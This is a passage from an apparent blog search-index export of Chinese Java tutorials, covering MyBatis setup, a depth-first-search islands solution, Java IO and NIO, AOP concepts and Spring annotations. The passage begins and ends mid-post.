value="jdbc:mysql://127.0.0.1:3306/mybatis" /&gt; &lt;property name="username" value="root"/&gt; &lt;property name="password" value="password"/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt; &lt;mappers&gt; &lt;mapper resource="com/yihaomen/mybatis/model/User.xml"/&gt; &lt;/mappers&gt;&lt;/configuration&gt; 建立与数据库对应的 java class,以及映射文件。 在 src_user下建立 package:com.yihaomen.mybatis.model ,并在这个 package 下建立 User 类: 1234567891011121314151617181920212223242526272829303132333435package com.yihaomen.mybatis.model;public class User &#123; private int id; private String userName; private String userAge; private String userAddress; public int getId() &#123; return id; &#125; public void setId(int id) &#123; this.id = id; &#125; public String getUserName() &#123; return userName; &#125; public void setUserName(String userName) &#123; this.userName = userName; &#125; public String getUserAge() &#123; return userAge; &#125; public void setUserAge(String userAge) &#123; this.userAge = userAge; &#125; public String getUserAddress() &#123; return userAddress; &#125; public void setUserAddress(String userAddress) &#123; this.userAddress = userAddress; &#125;&#125; 同时建立这个 User 的映射文件 User.xml: 123456789&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;mapper namespace="com.yihaomen.mybatis.models.UserMapper"&gt; &lt;select id="selectUserByID" parameterType="int" resultType="User"&gt; select * from `user` where id = #&#123;id&#125; &lt;/select&gt;&lt;/mapper&gt; 下面对这几个配置文件解释下： Configuration.xml 是 mybatis 用来建立 sessionFactory 用的，里面主要包含了数据库连接相关东西，还有 java 类所对应的别名，比如&lt;typeAlias alias=&quot;User&quot; type=&quot;com.yihaomen.mybatis.model.User&quot;/&gt; 这个别名非常重要，你在 具体的类的映射中，比如 User.xml 中 resultType 就是对应这里的。要保持一致，当然这里的 resultType 还有另外单独的定义方式，后面再说。 Configuration.xml 里面 的&lt;mapper resource=&quot;com/yihaomen/mybatis/model/User.xml&quot;/&gt;是包含要映射的类的 xml 配置文件。 在 User.xml 文件里面 主要是定义各种 SQL 语句，以及这些语句的参数，以及要返回的类型等。 开始测试 在 test_src 源码目录下建立 com.yihaomen.test 这个 package,并建立测试类 Test: 123456789101112131415161718192021222324252627282930313233343536373839package com.yihaomen.test;import java.io.Reader;import org.apache.ibatis.io.Resources;import org.apache.ibatis.session.SqlSession;import org.apache.ibatis.session.SqlSessionFactory;import org.apache.ibatis.session.SqlSessionFactoryBuilder;import com.yihaomen.mybatis.model.User;public class Test &#123; private static SqlSessionFactory sqlSessionFactory; private static Reader reader; static&#123; try&#123; reader = Resources.getResourceAsReader("Configuration.xml"); sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static SqlSessionFactory getSession()&#123; return sqlSessionFactory; &#125; public static void main(String[] args) &#123; SqlSession session = sqlSessionFactory.openSession(); try &#123; User user = (User) session.selectOne("com.yihaomen.mybatis.models.UserMapper.selectUserByID", 1); System.out.println(user.getUserAddress()); System.out.println(user.getUserName()); &#125; finally &#123; session.close(); &#125; &#125;&#125; 现在运行这个程序，是不是得到查询结果了。恭喜你，环境搭建配置成功，接下来第二章，将讲述基于接口的操作方式，增删改查。 整个工程目录结构如下:]]></content>
      <categories>
        <category>mybatis</category>
      </categories>
      <tags>
        <tag>ORM框架</tag>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis简介]]></title>
    <url>%2F2018%2F01%2F31%2FMybatis%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[简介什么是 Mybatis?MyBatis 是支持普通 SQL 查询，存储过程和高级映射的优秀持久层框架。MyBatis 消除了几乎所有的 JDBC 代码和参数的手工设置以及结果集的检索。MyBatis 使用简单的 XML 或注解用于配置和原始映射，将接口和 Java 的 POJOs（Plan Old Java Objects，普通的 Java 对象）映射成数据库中的记录。 orm工具的基本思想无论是用过的 hibernate,Mybatis,你都可以法相他们有一个共同点： 从配置文件(通常是 XML 配置文件中)得到 sessionfactory. 由 sessionfactory 产生 session 在 session 中完成对数据的增删改查和事务提交等. 在用完之后关闭 session 。 在 Java 对象和 数据库之间有做 mapping 的配置文件，也通常是 xml 文件。]]></content>
      <categories>
        <category>mybatis</category>
      </categories>
      <tags>
        <tag>ORM框架</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深度优先搜索]]></title>
    <url>%2F2018%2F01%2F23%2F%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%2F</url>
    <content type="text"><![CDATA[基本概念深度优先搜索算法（英语：Depth-First-Search，DFS）是一种用于遍历或搜索树或图的算法。沿着树的深度遍历树的节点，尽可能深的搜索树的分支。当节点v的所在边都己被探寻过，搜索将回溯到发现节点v的那条边的起始节点。这一过程一直进行到已发现从源节点可达的所有节点为止。如果还存在未被发现的节点，则选择其中一个作为源节点并重复以上过程，整个进程反复进行直到所有节点都被访问为止。属于盲目搜索。 例题：岛屿的个数 给定一个由 &#39;1&#39;（陆地）和 &#39;0&#39;（水）组成的的二维网格，计算岛屿的数量。一个岛被水包围，并且它是通过水平方向或垂直方向上相邻的陆地连接而成的。你可以假设网格的四个边均被水包围。 示例 1: 1234567输入:11110110101100000000输出: 1 示例 2: 1234567输入:11000110000010000011输出: 3 解决方案 1234567891011121314151617181920212223242526272829class Solution &#123; // DFS public int numIslands(char[][] grid) &#123; if(grid.length==0||grid[0].length==0) return 0; int res = 0; int row = grid.length; int col = grid[0].length; for(int i = 0; i &lt; row; i++)&#123; for(int j = 0; j &lt; col; j++)&#123; if(grid[i][j]==&apos;1&apos;)&#123; res++; dfs(grid, i, j,row,col); &#125; &#125; &#125; return res; &#125; private void dfs(char[][] grid, int i, int j, int row, int col)&#123; if(i&lt;0 || i&gt;=row || j&lt;0 || j&gt;=col || grid[i][j]==&apos;0&apos;)&#123; return; &#125; grid[i][j] = &apos;0&apos;; dfs(grid, i-1, j, row, col); dfs(grid, i+1, j, row, col); dfs(grid, i, j-1, row, col); dfs(grid, i, j+1, row, col); &#125;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>深度优先搜索</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaIO]]></title>
    <url>%2F2018%2F01%2F19%2FJavaIO%2F</url>
    <content type="text"><![CDATA[一、概览Java 的 I/O 大概可以分成以下几类： 磁盘操作：File 字节操作：InputStream 和 OutputStream 字符操作：Reader 和 Writer 对象操作：Serializable 网络操作：Socket 新的输入/输出：NIO 二、磁盘操作File 类可以用于表示文件和目录的信息，但是它不表示文件的内容。 递归地列出一个目录下所有文件： 123456789101112public static void listAllFiles(File dir) &#123; if (dir == null || !dir.exists()) &#123; return; &#125; if (dir.isFile()) &#123; System.out.println(dir.getName()); return; &#125; for (File file : dir.listFiles()) &#123; listAllFiles(file); &#125;&#125; 从 Java7 开始，可以使用 Paths 和 Files 代替 File。 三、字节操作实现文件复制1234567891011121314151617public static void copyFile(String src, String dist) throws IOException &#123; FileInputStream in = new FileInputStream(src); FileOutputStream out = new FileOutputStream(dist); byte[] buffer = new byte[20 * 1024]; int cnt; // read() 最多读取 buffer.length 个字节 // 返回的是实际读取的个数 // 返回 -1 的时候表示读到 eof，即文件尾 while ((cnt = in.read(buffer, 0, buffer.length)) != -1) &#123; out.write(buffer, 0, cnt); &#125; in.close(); out.close();&#125; 装饰者模式Java I/O 使用了装饰者模式来实现。以 InputStream 为例， InputStream 是抽象组件； FileInputStream 是 InputStream 的子类，属于具体组件，提供了字节流的输入操作； FilterInputStream 属于抽象装饰者，装饰者用于装饰组件，为组件提供额外的功能。例如 BufferedInputStream 为 FileInputStream 提供缓存的功能。 实例化一个具有缓存功能的字节流对象时，只需要在 FileInputStream 对象上再套一层 BufferedInputStream 对象即可。 12FileInputStream fileInputStream = new FileInputStream(filePath);BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream); DataInputStream 装饰者提供了对更多数据类型进行输入的操作，比如 int、double 等基本类型。 四、字符操作编码与解码编码就是把字符转换为字节，而解码是把字节重新组合成字符。 如果编码和解码过程使用不同的编码方式那么就出现了乱码。 GBK 编码中，中文字符占 2 个字节，英文字符占 1 个字节； UTF-8 编码中，中文字符占 3 个字节，英文字符占 1 个字节； UTF-16be 编码中，中文字符和英文字符都占 2 个字节。 UTF-16be 中的 be 指的是 Big Endian，也就是大端。相应地也有 UTF-16le，le 指的是 Little Endian，也就是小端。 Java 的内存编码使用双字节编码 UTF-16be，这不是指 Java 只支持这一种编码方式，而是说 char 这种类型使用 UTF-16be 进行编码。char 类型占 16 位，也就是两个字节，Java 使用这种双字节编码是为了让一个中文或者一个英文都能使用一个 char 来存储。 String 的编码方式String 可以看成一个字符序列，可以指定一个编码方式将它编码为字节序列，也可以指定一个编码方式将一个字节序列解码为 String。 1234String str1 = "中文";byte[] bytes = str1.getBytes("UTF-8");String str2 = new String(bytes, "UTF-8");System.out.println(str2); 在调用无参数 getBytes() 方法时，默认的编码方式不是 UTF-16be。双字节编码的好处是可以使用一个 char 存储中文和英文，而将 String 转为 bytes[] 字节数组就不再需要这个好处，因此也就不再需要双字节编码。getBytes() 的默认编码方式与平台有关，一般为 UTF-8。 1byte[] bytes = str1.getBytes(); Reader 与 Writer不管是磁盘还是网络传输，最小的存储单元都是字节，而不是字符。但是在程序中操作的通常是字符形式的数据，因此需要提供对字符进行操作的方法。 InputStreamReader 实现从字节流解码成字符流； OutputStreamWriter 实现字符流编码成为字节流。 实现逐行输出文本文件的内容123456789101112131415public static void readFileContent(String filePath) throws IOException &#123; FileReader fileReader = new FileReader(filePath); BufferedReader bufferedReader = new BufferedReader(fileReader); String line; while ((line = bufferedReader.readLine()) != null) &#123; System.out.println(line); &#125; // 装饰者模式使得 BufferedReader 组合了一个 Reader 对象 // 在调用 BufferedReader 的 close() 方法时会去调用 Reader 的 close() 方法 // 因此只要一个 close() 调用即可 bufferedReader.close();&#125; 五、对象操作序列化序列化就是将一个对象转换成字节序列，方便存储和传输。 序列化：ObjectOutputStream.writeObject() 反序列化：ObjectInputStream.readObject() 不会对静态变量进行序列化，因为序列化只是保存对象的状态，静态变量属于类的状态。 Serializable序列化的类需要实现 Serializable 接口，它只是一个标准，没有任何方法需要实现，但是如果不去实现它的话而进行序列化，会抛出异常。 123456789101112131415161718192021222324252627282930public static void main(String[] args) throws IOException, ClassNotFoundException &#123; A a1 = new A(123, "abc"); String objectFile = "file/a1"; ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(objectFile)); objectOutputStream.writeObject(a1); objectOutputStream.close(); ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(objectFile)); A a2 = (A) objectInputStream.readObject(); objectInputStream.close(); System.out.println(a2);&#125;private static class A implements Serializable &#123; private int x; private String y; A(int x, String y) &#123; this.x = x; this.y = y; &#125; @Override public String toString() &#123; return "x = " + x + " " + "y = " + y; &#125;&#125; transienttransient 关键字可以使一些属性不会被序列化。 ArrayList 中存储数据的数组 elementData 是用 transient 修饰的，因为这个数组是动态扩展的，并不是所有的空间都被使用，因此就不需要所有的内容都被序列化。通过重写序列化和反序列化方法，使得可以只序列化数组中有内容的那部分数据。 1private transient Object[] elementData; 六、网络操作Java 中的网络支持： InetAddress：用于表示网络上的硬件资源，即 IP 地址； URL：统一资源定位符； Sockets：使用 TCP 协议实现网络通信； Datagram：使用 UDP 协议实现网络通信。 InetAddress没有公有的构造函数，只能通过静态方法来创建实例。 12InetAddress.getByName(String host);InetAddress.getByAddress(byte[] address); URL可以直接从 URL 中读取字节流数据。 1234567891011121314151617181920public static void main(String[] args) throws IOException &#123; URL url = new URL("http://www.baidu.com"); /* 字节流 */ InputStream is = url.openStream(); /* 字符流 */ InputStreamReader isr = new InputStreamReader(is, "utf-8"); /* 提供缓存功能 */ BufferedReader br = new BufferedReader(isr); String line; while ((line = br.readLine()) != null) &#123; System.out.println(line); &#125; br.close();&#125; Sockets ServerSocket：服务器端类 Socket：客户端类 服务器和客户端通过 InputStream 和 OutputStream 进行输入输出。 Datagram DatagramSocket：通信类 DatagramPacket：数据包类 七、NIO新的输入/输出 (NIO) 库是在 JDK 1.4 中引入的，弥补了原来的 I/O 的不足，提供了高速的、面向块的 I/O。 流与块I/O 与 NIO 最重要的区别是数据打包和传输的方式，I/O 以流的方式处理数据，而 NIO 以块的方式处理数据。 面向流的 I/O 一次处理一个字节数据：一个输入流产生一个字节数据，一个输出流消费一个字节数据。为流式数据创建过滤器非常容易，链接几个过滤器，以便每个过滤器只负责复杂处理机制的一部分。不利的一面是，面向流的 I/O 通常相当慢。 面向块的 I/O 一次处理一个数据块，按块处理数据比按流处理数据要快得多。但是面向块的 I/O 缺少一些面向流的 I/O 所具有的优雅性和简单性。 I/O 包和 NIO 已经很好地集成了，java.io.* 已经以 NIO 为基础重新实现了，所以现在它可以利用 NIO 的一些特性。例如，java.io.* 包中的一些类包含以块的形式读写数据的方法，这使得即使在面向流的系统中，处理速度也会更快。 通道与缓冲区1. 通道通道 Channel 是对原 I/O 包中的流的模拟，可以通过它读取和写入数据。 通道与流的不同之处在于，流只能在一个方向上移动(一个流必须是 InputStream 或者 OutputStream 的子类)，而通道是双向的，可以用于读、写或者同时用于读写。 通道包括以下类型： FileChannel：从文件中读写数据； DatagramChannel：通过 UDP 读写网络中数据； SocketChannel：通过 TCP 读写网络中数据； ServerSocketChannel：可以监听新进来的 TCP 连接，对每一个新进来的连接都会创建一个 SocketChannel。 2. 缓冲区发送给一个通道的所有数据都必须首先放到缓冲区中，同样地，从通道中读取的任何数据都要先读到缓冲区中。也就是说，不会直接对通道进行读写数据，而是要先经过缓冲区。 缓冲区实质上是一个数组，但它不仅仅是一个数组。缓冲区提供了对数据的结构化访问，而且还可以跟踪系统的读/写进程。 缓冲区包括以下类型： ByteBuffer CharBuffer ShortBuffer IntBuffer LongBuffer FloatBuffer DoubleBuffer 缓冲区状态变量 capacity：最大容量； position：当前已经读写的字节数； limit：还可以读写的字节数。 状态变量的改变过程举例： ① 新建一个大小为 8 个字节的缓冲区，此时 position 为 0，而 limit = capacity = 8。capacity 变量不会改变，下面的讨论会忽略它。 ② 从输入通道中读取 5 个字节数据写入缓冲区中，此时 position 为 5，limit 保持不变。 ③ 在将缓冲区的数据写到输出通道之前，需要先调用 flip() 方法，这个方法将 limit 设置为当前 position，并将 position 设置为 0。 ④ 从缓冲区中取 4 个字节到输出缓冲中，此时 position 设为 4。 ⑤ 最后需要调用 clear() 方法来清空缓冲区，此时 position 和 limit 都被设置为最初位置。 文件 NIO 实例以下展示了使用 NIO 快速复制文件的实例： 12345678910111213141516171819202122232425262728293031323334353637public static void fastCopy(String src, String dist) throws IOException &#123; /* 获得源文件的输入字节流 */ FileInputStream fin = new FileInputStream(src); /* 获取输入字节流的文件通道 */ FileChannel fcin = fin.getChannel(); /* 获取目标文件的输出字节流 */ FileOutputStream fout = new FileOutputStream(dist); /* 获取输出字节流的文件通道 */ FileChannel fcout = fout.getChannel(); /* 为缓冲区分配 1024 个字节 */ ByteBuffer buffer = ByteBuffer.allocateDirect(1024); while (true) &#123; /* 从输入通道中读取数据到缓冲区中 */ int r = fcin.read(buffer); /* read() 返回 -1 表示 EOF */ if (r == -1) &#123; break; &#125; /* 切换读写 */ buffer.flip(); /* 把缓冲区的内容写入输出文件中 */ fcout.write(buffer); /* 清空缓冲区 */ buffer.clear(); &#125;&#125; 选择器NIO 常常被叫做非阻塞 IO，主要是因为 NIO 在网络通信中的非阻塞特性被广泛使用。 NIO 实现了 IO 多路复用中的 Reactor 模型，一个线程 Thread 使用一个选择器 Selector 通过轮询的方式去监听多个通道 Channel 上的事件，从而让一个线程就可以处理多个事件。 通过配置监听的通道 Channel 为非阻塞，那么当 Channel 上的 IO 事件还未到达时，就不会进入阻塞状态一直等待，而是继续轮询其它 Channel，找到 IO 事件已经到达的 Channel 执行。 因为创建和切换线程的开销很大，因此使用一个线程来处理多个事件而不是一个线程处理一个事件，对于 IO 密集型的应用具有很好地性能。 应该注意的是，只有套接字 Channel 才能配置为非阻塞，而 FileChannel 不能，为 FileChannel 配置非阻塞也没有意义。 1. 创建选择器1Selector selector = Selector.open(); 2. 将通道注册到选择器上123ServerSocketChannel ssChannel = ServerSocketChannel.open();ssChannel.configureBlocking(false);ssChannel.register(selector, SelectionKey.OP_ACCEPT); 通道必须配置为非阻塞模式，否则使用选择器就没有任何意义了，因为如果通道在某个事件上被阻塞，那么服务器就不能响应其它事件，必须等待这个事件处理完毕才能去处理其它事件，显然这和选择器的作用背道而驰。 在将通道注册到选择器上时，还需要指定要注册的具体事件，主要有以下几类： SelectionKey.OP_CONNECT SelectionKey.OP_ACCEPT SelectionKey.OP_READ SelectionKey.OP_WRITE 它们在 SelectionKey 的定义如下： 1234public static final int OP_READ = 1 &lt;&lt; 0;public static final int OP_WRITE = 1 &lt;&lt; 2;public static final int OP_CONNECT = 1 &lt;&lt; 3;public static final int OP_ACCEPT = 1 &lt;&lt; 4; 可以看出每个事件可以被当成一个位域，从而组成事件集整数。例如： 1int interestSet = SelectionKey.OP_READ | SelectionKey.OP_WRITE; 3. 监听事件1int num = selector.select(); 使用 select() 来监听到达的事件，它会一直阻塞直到有至少一个事件到达。 4. 获取到达的事件1234567891011Set&lt;SelectionKey&gt; keys = selector.selectedKeys();Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator();while (keyIterator.hasNext()) &#123; SelectionKey key = keyIterator.next(); if (key.isAcceptable()) &#123; // ... &#125; else if (key.isReadable()) &#123; // ... &#125; keyIterator.remove();&#125; 5. 事件循环因为一次 select() 调用不能处理完所有的事件，并且服务器端有可能需要一直监听事件，因此服务器端处理事件的代码一般会放在一个死循环内。 1234567891011121314while (true) &#123; int num = selector.select(); Set&lt;SelectionKey&gt; keys = selector.selectedKeys(); Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator(); while (keyIterator.hasNext()) &#123; SelectionKey key = keyIterator.next(); if (key.isAcceptable()) &#123; // ... &#125; else if (key.isReadable()) &#123; // ... &#125; keyIterator.remove(); &#125;&#125; 套接字 NIO 实例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071public class NIOServer &#123; public static void main(String[] args) throws IOException &#123; Selector selector = Selector.open(); ServerSocketChannel ssChannel = ServerSocketChannel.open(); ssChannel.configureBlocking(false); ssChannel.register(selector, SelectionKey.OP_ACCEPT); ServerSocket serverSocket = ssChannel.socket(); InetSocketAddress address = new InetSocketAddress("127.0.0.1", 8888); serverSocket.bind(address); while (true) &#123; selector.select(); Set&lt;SelectionKey&gt; keys = selector.selectedKeys(); Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator(); while (keyIterator.hasNext()) &#123; SelectionKey key = keyIterator.next(); if (key.isAcceptable()) &#123; ServerSocketChannel ssChannel1 = (ServerSocketChannel) key.channel(); // 服务器会为每个新连接创建一个 SocketChannel SocketChannel sChannel = ssChannel1.accept(); sChannel.configureBlocking(false); // 这个新连接主要用于从客户端读取数据 sChannel.register(selector, SelectionKey.OP_READ); &#125; else if (key.isReadable()) &#123; SocketChannel sChannel = (SocketChannel) key.channel(); System.out.println(readDataFromSocketChannel(sChannel)); sChannel.close(); &#125; keyIterator.remove(); &#125; &#125; &#125; private static String readDataFromSocketChannel(SocketChannel sChannel) throws IOException &#123; ByteBuffer buffer = ByteBuffer.allocate(1024); StringBuilder data = new StringBuilder(); while (true) &#123; buffer.clear(); int n = sChannel.read(buffer); if (n == -1) &#123; break; &#125; buffer.flip(); int limit = buffer.limit(); char[] dst = new char[limit]; for (int i = 0; i &lt; limit; i++) &#123; dst[i] = (char) buffer.get(i); &#125; data.append(dst); buffer.clear(); &#125; return data.toString(); &#125;&#125; 12345678910public class NIOClient &#123; public static void main(String[] args) throws IOException &#123; Socket socket = new Socket("127.0.0.1", 8888); OutputStream out = socket.getOutputStream(); String s = "hello world"; out.write(s.getBytes()); out.close(); &#125;&#125; 内存映射文件内存映射文件 I/O 是一种读和写文件数据的方法，它可以比常规的基于流或者基于通道的 I/O 快得多。 向内存映射文件写入可能是危险的，只是改变数组的单个元素这样的简单操作，就可能会直接修改磁盘上的文件。修改数据与将数据保存到磁盘是没有分开的。 下面代码行将文件的前 1024 个字节映射到内存中，map() 方法返回一个 MappedByteBuffer，它是 ByteBuffer 的子类。因此，可以像使用其他任何 ByteBuffer 一样使用新映射的缓冲区，操作系统会在需要时负责执行映射。 1MappedByteBuffer mbb = fc.map(FileChannel.MapMode.READ_WRITE, 0, 1024); 对比NIO 与普通 I/O 的区别主要有以下两点： NIO 是非阻塞的； NIO 面向块，I/O 面向流。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>IO</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AOP]]></title>
    <url>%2F2018%2F01%2F15%2FAOP%2F</url>
    <content type="text"><![CDATA[AOP概念AOP(Aspect-Oriented Programming)是面向切面编程的简称，定义如下： 计算机科学中,AOP是一种编程范式，通过分离横切关注点点来增加模块性。它可以在已有的代码上增加额外的行为，却不需要修改已有的代码，而是通过指定代码的切点来实现。 JoinPoint(连接点，加入点)JoinPoint(连接点，加入点)，如类的初始化前，类的初始化后，类的某个方法调用前，类的某个方法调用后，方法抛出异常后等位置。 Spring仅支持方法的JoinPoint。 PointCut(切点)PointCut(切点)，每个程序都有多个JoinPoint, 其中我们感兴趣的那个JoinPoint，要下手操作的那个点叫做Pointcut。 Advice(增强)Advice(增强)，我们找到感兴趣的点(PointCut)之后做什么呢，不管做什么，都是比之前做的事情多了那么一点点，所以可以理解为增强。 TargetTarget 目标对象，要下手的目标类。 Weaving (织入)Weaving (织入)，将Advice添加到Target的具体JoinPoint的过程。]]></content>
      <tags>
        <tag>AOP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring注解]]></title>
    <url>%2F2018%2F01%2F13%2FSpring%E6%B3%A8%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Spring中注解大全和应用 @Controller @RestController： @Service @Autowired @RequestMapping @RequestParam @ModelAttribute @Cacheable @CacheEvict @Resource @PostConstruct @PreDestroy @Repository @Component @Scope @SessionAttributes @Required @Qualifier @Controller标识一个该类是Spring MVC controller处理器，用来创建处理http请求的对象. 12345678@Controllerpublic class TestController &#123; @RequestMapping("/test") public String test(Map&lt;String,Object&gt; map)&#123; return "hello"; &#125;&#125; @RestControllerSpring4之后加入的注解，原来在@Controller中返回json需要@ResponseBody来配合，如果直接用@RestController替代@Controller就不需要再配置@ResponseBody，默认返回json格式。 12345678@RestControllerpublic class TestController &#123; @RequestMapping("/test") public String test(Map&lt;String,Object&gt; map)&#123; return "hello"; &#125;&#125; @Service用于标注业务层组件，说白了就是加入你有一个用注解的方式把这个类注入到spring配置中 @Autowired用来装配bean，都可以写在字段上，或者方法上。默认情况下必须要求依赖对象必须存在，如果要允许null值，可以设置它的required属性为false，例如：@Autowired(required=false) @RequestMapping类定义处: 提供初步的请求映射信息，相对于 WEB 应用的根目录。方法处: 提供进一步的细分映射信息，相对于类定义处的 URL。 用过RequestMapping的同学都知道，他有非常多的作用，因此详细的用法我会在下一篇文章专门讲述，请关注公众号哦，以免错过。 @RequestParam用于将请求参数区数据映射到功能处理方法的参数上例如 123public Resp test(@RequestParam Integer id)&#123; return Resp.success(customerInfoService.fetch(id)); &#125; 这个id就是要接收从接口传递过来的参数id的值的，如果接口传递过来的参数名和你接收的不一致，也可以如下 123public Resp test(@RequestParam(value="course_id") Integer id)&#123; return Resp.success(customerInfoService.fetch(id)); &#125; 其中course_id就是接口传递的参数，id就是映射course_id的参数名 @ModelAttribute使用地方有三种： 1. 标记在方法上。 标记在方法上，会在每一个@RequestMapping标注的方法前执行，如果有返回值，则自动将该返回值加入到ModelMap中。 A.在有返回的方法上:当ModelAttribute设置了value，方法返回的值会以这个value为key，以参数接受到的值作为value，存入到Model中，如下面的方法执行之后，最终相当于 model.addAttribute(“user_name”, name);假如 @ModelAttribute没有自定义value，则相当于model.addAttribute(“name”, name); 12345@ModelAttribute(value="user_name") public String before2(@RequestParam(required = false) String name, Model model) &#123; System.out.println("进入了2：" + name); return name; &#125; B.在没返回的方法上：需要手动model.add方法 12345@ModelAttributepublic void before(@RequestParam(required = false) Integer age, Model model) &#123; model.addAttribute("age", age); System.out.println("进入了1：" + age);&#125; 我们在当前类下建一个请求方法： 12345678910@RequestMapping(value="/mod") public Resp mod( @RequestParam(required = false) String name, @RequestParam(required = false) Integer age, Model model)&#123; System.out.println("进入mod"); System.out.println("参数接受的数值&#123;name="+name+";age="+age+"&#125;"); System.out.println("model传过来的值:"+model); return Resp.success("1"); &#125; 在浏览器中输入访问地址并且加上参数：http://localhost:8081/api/test/mod?name=我是小菜&amp;age=12 最终输出如下： 12345进入了1：40进入了2：我是小菜进入mod参数接受的数值&#123;name=我是小菜;age=12&#125;model传过来的值:&#123;age=40, user_name=我是小菜&#125; 2. 标记在方法的参数上。 标记在方法的参数上，会将客户端传递过来的参数按名称注入到指定对象中，并且会将这个对象自动加入ModelMap中，便于View层使用.我们在上面的类中加入一个方法如下 1234567891011@RequestMapping(value="/mod2") public Resp mod2(@ModelAttribute("user_name") String user_name, @ModelAttribute("name") String name, @ModelAttribute("age") Integer age,Model model)&#123; System.out.println("进入mod2"); System.out.println("user_name:"+user_name); System.out.println("name："+name); System.out.println("age:"+age); System.out.println("model:"+model); return Resp.success("1"); &#125; 在浏览器中输入访问地址并且加上参数：http://localhost:8081/api/test/mod2?name=我是小菜&amp;age=12最终输出： 1234567进入了1：40进入了2：我是小菜进入mod2user_name:我是小菜name：我是小菜age:40model:&#123;user_name=我是小菜, org.springframework.validation.BindingResult.user_name=org.springframework.validation.BeanPropertyBindingResult: 0 errors, name=我是小菜, org.springframework.validation.BindingResult.name=org.springframework.validation.BeanPropertyBindingResult: 0 errors, age=40, org.springframework.validation.BindingResult.age=org.springframework.validation.BeanPropertyBindingResult: 0 errors&#125; 从结果就能看出，用在方法参数中的@ModelAttribute注解，实际上是一种接受参数并且自动放入Model对象中，便于使用。 @Cacheable用来标记缓存查询。可用用于方法或者类中， 当标记在一个方法上时表示该方法是支持缓存的，当标记在一个类上时则表示该类所有的方法都是支持缓存的。 参数列表 参数 解释 例子 value 名称 @Cacheable(value={”c1”,”c2”} key key @Cacheable(value=”c1”,key=”#id”) condition 条件 @Cacheable(value=”c1”,condition=”#id=1”) 比如@Cacheable(value=”UserCache”) 标识的是当调用了标记了这个注解的方法时，逻辑默认加上从缓存中获取结果的逻辑，如果缓存中没有数据，则执行用户编写查询逻辑，查询成功之后，同时将结果放入缓存中。但凡说到缓存，都是key-value的形式的，因此key就是方法中的参数（id），value就是查询的结果，而命名空间UserCache是在spring*.xml中定义. 1234567@Cacheable(value="UserCache")// 使用了一个缓存名叫 accountCache public Account getUserAge(int id) &#123; //这里不用写缓存的逻辑，直接按正常业务逻辑走即可， //缓存通过切面自动切入 int age=getUser(id); return age; &#125; @CacheEvict用来标记要清空缓存的方法，当这个方法被调用后，即会清空缓存。@CacheEvict(value=”UserCache”) 参数列表 参数 解释 例子 value 名称 @CachEvict(value={”c1”,”c2”} key key @CachEvict(value=”c1”,key=”#id”) condition 缓存的条件，可以为空 allEntries 是否清空所有缓存内容 @CachEvict(value=”c1”，allEntries=true) beforeInvocation 是否在方法执行前就清空 @CachEvict(value=”c1”，beforeInvocation=true) @Resource@Resource的作用相当于@Autowired只不过@Autowired按byType自动注入，而@Resource默认按 byName自动注入罢了。 @Resource有两个属性是比较重要的，分是name和type，Spring将@Resource注解的name属性解析为bean的名字，而type属性则解析为bean的类型。所以如果使用name属性，则使用byName的自动注入策略，而使用type属性时则使用byType自动注入策略。如果既不指定name也不指定type属性，这时将通过反射机制使用byName自动注入策略。 @Resource装配顺序: 如果同时指定了name和type，则从Spring上下文中找到唯一匹配的bean进行装配，找不到则抛出异常 如果指定了name，则从上下文中查找名称（id）匹配的bean进行装配，找不到则抛出异常 如果指定了type，则从上下文中找到类型匹配的唯一bean进行装配，找不到或者找到多个，都会抛出异常 如果既没有指定name，又没有指定type，则自动按照byName方式进行装配；如果没有匹配，则回退为一个原始类型进行匹配，如果匹配则自动装配； @PostConstruct用来标记是在项目启动的时候执行这个方法。用来修饰一个非静态的void()方法也就是spring容器启动时就执行，多用于一些全局配置、数据字典之类的加载 被@PostConstruct修饰的方法会在服务器加载Servlet的时候运行，并且只会被服务器执行一次。PostConstruct在构造函数之后执行,init()方法之前执行。PreDestroy（）方法在destroy()方法执行执行之后执 @PreDestroy被@PreDestroy修饰的方法会在服务器卸载Servlet的时候运行，并且只会被服务器调用一次，类似于Servlet的destroy()方法。被@PreDestroy修饰的方法会在destroy()方法之后运行，在Servlet被彻底卸载之前 @Repository用于标注数据访问组件，即DAO组件 @Component泛指组件，当组件不好归类的时候，我们可以使用这个注解进行标注 @Scope用来配置 spring bean 的作用域，它标识 bean 的作用域。默认值是单例 singleton:单例模式,全局有且仅有一个实例 prototype:原型模式,每次获取Bean的时候会有一个新的实例 request:request表示该针对每一次HTTP请求都会产生一个新的bean，同时该bean仅在当前HTTP request内有效 session:session作用域表示该针对每一次HTTP请求都会产生一个新的bean，同时该bean仅在当前HTTP session内有效 global session:只在portal应用中有用，给每一个 global http session 新建一个Bean实例。 @SessionAttributes默认情况下Spring MVC将模型中的数据存储到request域中。当一个请求结束后，数据就失效了。如果要跨页面使用。那么需要使用到session。而@SessionAttributes注解就可以使得模型中的数据存储一份到session域中 参数： names：这是一个字符串数组。里面应写需要存储到session中数据的名称。 types：根据指定参数的类型，将模型中对应类型的参数存储到session中3、value：和names是一样的。 12345678910 @Controller 